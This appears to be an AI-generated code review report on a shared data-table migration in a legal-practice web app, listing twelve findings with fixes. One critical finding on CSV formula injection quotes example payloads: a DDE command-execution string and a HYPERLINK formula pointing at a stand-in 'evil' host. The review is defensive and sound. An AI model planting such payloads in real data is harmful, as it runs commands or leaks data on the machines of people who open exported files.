---
phase: LEXCV-104-padr-o-datatable-partilhado
reviewed: 2026-07-16T00:00:00Z
depth: standard
files_reviewed: 16
files_reviewed_list:
  - web/package.json
  - web/src/app/(dashboard)/clientes/columns.tsx
  - web/src/app/(dashboard)/clientes/page.tsx
  - web/src/app/(dashboard)/documentos/columns.tsx
  - web/src/app/(dashboard)/documentos/page.tsx
  - web/src/app/(dashboard)/financeiro/columns.tsx
  - web/src/app/(dashboard)/financeiro/page.tsx
  - web/src/app/(dashboard)/notificacoes/page.tsx
  - web/src/app/(dashboard)/pareceres/columns.tsx
  - web/src/app/(dashboard)/pareceres/page.tsx
  - web/src/app/(dashboard)/processos/columns.tsx
  - web/src/app/(dashboard)/processos/page.tsx
  - web/src/components/shared/data-table/data-table-column-header.tsx
  - web/src/components/shared/data-table/data-table-pagination.tsx
  - web/src/components/shared/data-table/data-table-view-options.tsx
  - web/src/components/shared/data-table/data-table.tsx
  - web/src/components/ui/pagination.tsx
findings:
  critical: 1
  warning: 6
  info: 5
  total: 12
status: issues_found
---

# Phase LEXCV-104: Code Review Report

**Reviewed:** 2026-07-16T00:00:00Z
**Depth:** standard
**Files Reviewed:** 16
**Status:** issues_found

## Summary

Reviewed the shared TanStack-Table-based `DataTable` primitive (`data-table.tsx`, `data-table-column-header.tsx`, `data-table-pagination.tsx`, `data-table-view-options.tsx`), the shadcn `Pagination` primitive, and the 5 migrated list screens (Clientes, Processos, Pareceres, Financeiro, Documentos) plus `/notificacoes`. RBAC gating (`canEdit*`/`canCreate*` threaded from `usePermissions()`) is preserved in every `columns.tsx` Ações cell that has one, and the multi-tenant read paths are unaffected by this UI-only migration.

The most serious finding is a CSV/formula-injection vulnerability (CWE-1236) in the Financeiro export function — it neutralizes quotes/commas/newlines but not leading `=`, `+`, `-`, `@`, so an attacker-controlled cliente/processo name is executed as a formula when the exported file is opened in Excel/Sheets. The same escaping gap exists in the shared `lib/csv.ts` helper used by the Clientes CSV export.

Beyond that, most issues are systemic quality/consistency gaps introduced by the migration itself: the new column-visibility dropdown (`DataTableViewOptions`) can never show a human-readable label because every column's `header` is a render function rather than a string, so all 5 tables show raw column ids in that menu; the Documentos desktop Ações column dropped the Download action that the mobile card still has; and column-def memoization is inconsistent across the 5 pages (2 of 5 wrap it in `useMemo`, 3 don't).

## Critical Issues

### CR-01: CSV/Formula-injection in Financeiro export (and shared CSV helper)

**File:** `web/src/app/(dashboard)/financeiro/page.tsx:31-36`
**Issue:** `escapeField()` only quotes values containing `,`, `"`, or `\n`. It does not neutralize a leading `=`, `+`, `-`, or `@`, which spreadsheet applications (Excel, LibreOffice, Google Sheets) interpret as the start of a formula when the CSV is opened. Every field written by `exportHonorariosCsv` (`web/src/app/(dashboard)/financeiro/page.tsx:53-92`) is attacker-influenced end-to-end: `processoLabel` and `clienteLabel` come straight from `Processo.numero/titulo` and `Cliente.nome`, both of which are free-text fields any user with `clientes:create`/`processos:create` can set (e.g. a cliente named `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/",...)`). Anyone who exports "Honorários" and opens the file in Excel executes that payload. The exact same escaping gap exists in `web/src/lib/csv.ts`'s `escapeCsvValue`, which is used by the Clientes CSV export (`web/src/app/(dashboard)/clientes/page.tsx:110-129`, `nome` field), so the same vector is reachable from Clientes as well.
**Fix:**
```ts
// web/src/app/(dashboard)/financeiro/page.tsx
const FORMULA_TRIGGER_CHARS = ["=", "+", "-", "@", "\t", "\r"];

function escapeField(value: string): string {
  let v = value;
  if (FORMULA_TRIGGER_CHARS.some((c) => v.startsWith(c))) {
    v = "'" + v; // neutralize formula interpretation, mirrors OWASP CSV-injection guidance
  }
  if (v.includes(",") || v.includes('"') || v.includes("\n") || v.includes("\r")) {
    return '"' + v.replace(/"/g, '""') + '"';
  }
  return v;
}
```
Apply the same prefixing in `web/src/lib/csv.ts`'s `escapeCsvValue` so the Clientes export is covered too (both should ideally share one implementation — see WR-05 for the related duplication finding).

## Warnings

### WR-01: Documentos desktop Ações column has no Download action (mobile/desktop parity gap)

**File:** `web/src/app/(dashboard)/documentos/columns.tsx:50-84,159-167`
**Issue:** `DocumentoAcoesCell` (used by the desktop `DataTable`) renders only an "Apagar" button gated on `canEditDocumentos`, and returns `null` entirely for users without edit permission — i.e. the desktop table has no way to download a document from the row at all. Compare with `DocumentoMobileCard` in `documentos/page.tsx:165-245`, which renders an explicit "Download" link (`/api/v1/documentos/${id}/download`) available to every viewer regardless of edit permission. Desktop users (the majority, given `hidden md:block`/`md:hidden` split) lose a capability mobile users retain; they must know to click into the detail page instead.
**Fix:** Add a Download link to `DocumentoAcoesCell`, ungated by `canEditDocumentos` (matching the mobile card's availability to all viewers):
```tsx
<div className="inline-flex items-center gap-1">
  <a href={`/api/v1/documentos/${encodeURIComponent(documento.id)}/download`} target="_blank" rel="noreferrer">
    <Button type="button" variant="ghost" size="sm" aria-label="Download">
      <Download className="h-4 w-4" />
    </Button>
  </a>
  {canEditDocumentos ? (/* existing Apagar button */) : null}
</div>
```

### WR-02: Column-visibility dropdown always shows raw column ids, never the header title

**File:** `web/src/components/shared/data-table/data-table-view-options.tsx:56-57`
**Issue:** `const label = typeof header === "string" ? header : column.id;` — but every single column definition across all 5 migrated tables sets `header: ({ column }) => <DataTableColumnHeader column={column} title="..." />`, i.e. `header` is always a function, never a string. The `"string"` branch is therefore dead code and the dropdown always falls back to `column.id`. This surfaces unfriendly raw ids to end users: e.g. Documentos shows "processo_id", "cliente_id", "confidencialidade"; Financeiro shows "valorTotal", "dataAcordo"; Processos shows "area_juridica". This defeats the purpose of the newly-added view-options feature (a human-readable column picker) on every screen that uses it.
**Fix:** Thread the human title through `columnDef.meta` (TanStack Table's supported mechanism for this) instead of only inside the header render prop, and read it back in `DataTableViewOptions`:
```tsx
// columns.tsx, e.g. documentos
{
  accessorKey: "processo_id",
  meta: { label: "Processo" },
  header: ({ column }) => <DataTableColumnHeader column={column} title="Processo" />,
  ...
}

// data-table-view-options.tsx
const label = (column.columnDef.meta as { label?: string } | undefined)?.label ?? column.id;
```

### WR-03: Clientes "NIF" column sorts by a different value than it displays

**File:** `web/src/app/(dashboard)/clientes/columns.tsx:182-208`
**Issue:** The column's `accessorFn` (used for sorting) is `cliente.nif ?? cliente.documento_numero ?? cliente.documentoNumero ?? ""`. Since `Cliente.nif` is a required, non-optional `string` (`web/src/types/clientes.ts:39`), the `??` chain effectively always resolves to `cliente.nif` (an empty string `""` is not `null`/`undefined`, so it never falls through). But the **cell** renders `documento_numero`/`documento_tipo` instead of `nif` whenever `documento_tipo` (or `documentoTipo`) is set — which is exactly the common case for `PARTICULAR` clients using BI/passport identifiers. The result: sorting the "NIF" column orders rows by `nif`, while the visible column shows document numbers — clicking the sort header will visibly "not sort" for any dataset mixing empresa/particular clients.
**Fix:** Make the accessor match what's actually displayed:
```ts
accessorFn: (cliente) =>
  (cliente.documento_tipo || cliente.documentoTipo)
    ? (cliente.documento_numero ?? cliente.documentoNumero ?? "")
    : (cliente.nif ?? ""),
```

### WR-04: Inconsistent memoization of column defs across the 5 migrated pages

**File:** `web/src/app/(dashboard)/processos/page.tsx:55-56`, `web/src/app/(dashboard)/pareceres/page.tsx:439`, `web/src/app/(dashboard)/financeiro/page.tsx:296`
**Issue:** Clientes (`clientes/page.tsx:64`) and Documentos (`documentos/page.tsx:62`) wrap their `columns(...)` factory call in `React.useMemo`. Processos, Pareceres, and Financeiro instead call `columns(...)` directly inline on every render (and, for Processos/Financeiro, also rebuild the `clienteNomeById`/`processoById` lookup `Map`s fresh on every render rather than memoizing them). This is an inconsistent pattern across screens meant to share one convention, and it means `useReactTable` receives a brand-new `columns` array identity on every keystroke in a sibling filter field.
**Fix:** Apply the same pattern uniformly, e.g. in `processos/page.tsx`:
```ts
const clienteNomeById = React.useMemo(
  () => new Map((clientes.data ?? []).map((c) => [c.id, c.nome] as const)),
  [clientes.data],
);
const processoColumns = React.useMemo(() => columns(clienteNomeById), [clienteNomeById]);
```

### WR-05: Duplicated formatting/status logic between `columns.tsx` and `page.tsx`

**File:** `web/src/app/(dashboard)/financeiro/columns.tsx:11-30` / `web/src/app/(dashboard)/financeiro/page.tsx:17-29`, and `web/src/app/(dashboard)/pareceres/columns.tsx:13-30` / `web/src/app/(dashboard)/pareceres/page.tsx:24-41`
**Issue:** `formatMoneyCVE`, `formatDate`, and `calcHonorarioStatus` are defined verbatim in both `financeiro/columns.tsx` and `financeiro/page.tsx`. `formatDate` and `statusVariant` are likewise duplicated verbatim in both `pareceres/columns.tsx` and `pareceres/page.tsx`. Any future change to a status threshold, badge color mapping, or date format has to be made in two places and will silently drift if one is missed (e.g. the mobile card branch in `financeiro/page.tsx` and the desktop column cell already risk diverging).
**Fix:** Extract each pair into a shared module (e.g. `lib/financeiro.ts`, `lib/pareceres.ts`) and import from both `columns.tsx` and `page.tsx`.

### WR-06: Shared `DataTable` relies on index-based row identity while several columns hold per-row local state

**File:** `web/src/components/shared/data-table/data-table.tsx:47-72`
**Issue:** `useReactTable` is configured without a `getRowId`, so TanStack Table falls back to the default index-based row id. Several `Ações` cells render components that own per-row local React state/hooks tied to that row identity: `ClienteAcoesCell` calls `useDeleteCliente(cliente.id)` per row, and `DocumentoAcoesCell` holds `React.useState<string | null>` for an inline error message. Because `TableRow key={row.id}` in `data-table.tsx:100` is index-based rather than entity-based, if the underlying `data` array is ever reordered between renders without changing its reference identity semantics that TanStack considers "new" (e.g. a refetch that returns the same length but a different order), React will reuse the row component instance for what is now a different entity — potentially showing a stale delete-error message or a stuck "pending" spinner against the wrong row.
**Fix:** Add an optional `getRowId` prop to the shared `DataTable` and pass a stable id from each caller:
```tsx
interface DataTableProps<TData, TValue> {
  columns: ColumnDef<TData, TValue>[];
  data: TData[];
  getRowId?: (row: TData) => string;
}
// ...
const table = useReactTable({ data, columns, getRowId, ... });
```
```tsx
// clientes/page.tsx
<DataTable columns={clienteColumns} data={clientes.data} getRowId={(c) => c.id} />
```

## Info

### IN-01: `DataTable`'s empty-state `colSpan` uses the raw columns prop, not the visible-leaf-column count

**File:** `web/src/components/shared/data-table/data-table.tsx:110-115`
**Issue:** `colSpan={columns.length}` uses the length of the full `columns` prop array, not `table.getVisibleLeafColumns().length`. If a user hides columns via `DataTableViewOptions` and the visible page then has zero rows, the "Sem resultados" cell will span more columns than are actually rendered in the header. Currently unreachable in practice because every one of the 5 call sites already guards on `data.length` before rendering `<DataTable>` at all, but it's a latent bug for future reuse of this shared component.
**Fix:** `colSpan={table.getVisibleLeafColumns().length}`.

### IN-02: Pareceres protects a different "anchor" column than its sibling screens

**File:** `web/src/app/(dashboard)/pareceres/columns.tsx:41-43,52-63`
**Issue:** Clientes, Documentos, and Processos all mark their primary identity/name column `enableHiding: false` (the column carrying the main navigation link). Pareceres instead marks `status` as non-hideable while `cliente` (which carries the `Link` to the parecer detail page) can be hidden via the view-options dropdown. Not fatal — the Ações column's "Ver detalhes" button still works — but it's an inconsistent convention versus the other 4 screens.
**Fix:** Consider marking the `cliente` column `enableHiding: false` instead of/in addition to `status`, for consistency with the other screens' "identity column can't be hidden" convention.

### IN-03: Dead fallback on a non-optional field

**File:** `web/src/app/(dashboard)/documentos/columns.tsx:147`
**Issue:** `` `v${row.original.versao ?? 1}` `` — `Documento.versao` is typed as a required `number` (`web/src/types/documentos.ts:8`), so the `?? 1` branch can never execute per the type contract. Either the type is wrong (API can omit `versao`) or the fallback is dead code; worth confirming against the actual API contract.
**Fix:** If the API guarantees `versao`, drop the `?? 1`. If it doesn't, make the type `versao?: number`.

### IN-04: Download link missing `encodeURIComponent` (inconsistent with the rest of the file)

**File:** `web/src/app/(dashboard)/documentos/page.tsx:223`
**Issue:** `href={`/api/v1/documentos/${id}/download`}` interpolates `id` directly, whereas every other link in the same file (and the desktop columns) uses `encodeURIComponent(...)` (e.g. `documentos/page.tsx:201`, `documentos/columns.tsx:99`). Harmless while ids are UUIDs, but inconsistent with the codebase's own convention and would become a real bug if `id` format ever changes.
**Fix:** `href={`/api/v1/documentos/${encodeURIComponent(id)}/download`}`.

### IN-05: Raw `<input>` elements bypass the shared `Input` component

**File:** `web/src/app/(dashboard)/financeiro/page.tsx:235-250`, `web/src/app/(dashboard)/pareceres/page.tsx:262-268,334-349`
**Issue:** Financeiro's date filters and Pareceres' "Pesquisa Avançada" text/date fields use raw `<input>` elements with hand-duplicated Tailwind classes, while Clientes and Processos use the shared `@/components/ui/input` `Input` component for equivalent fields. This is a style/consistency drift introduced across the migrated screens rather than a functional bug.
**Fix:** Replace the raw `<input>` elements with the shared `Input` component for consistency with Clientes/Processos.

---

_Reviewed: 2026-07-16T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
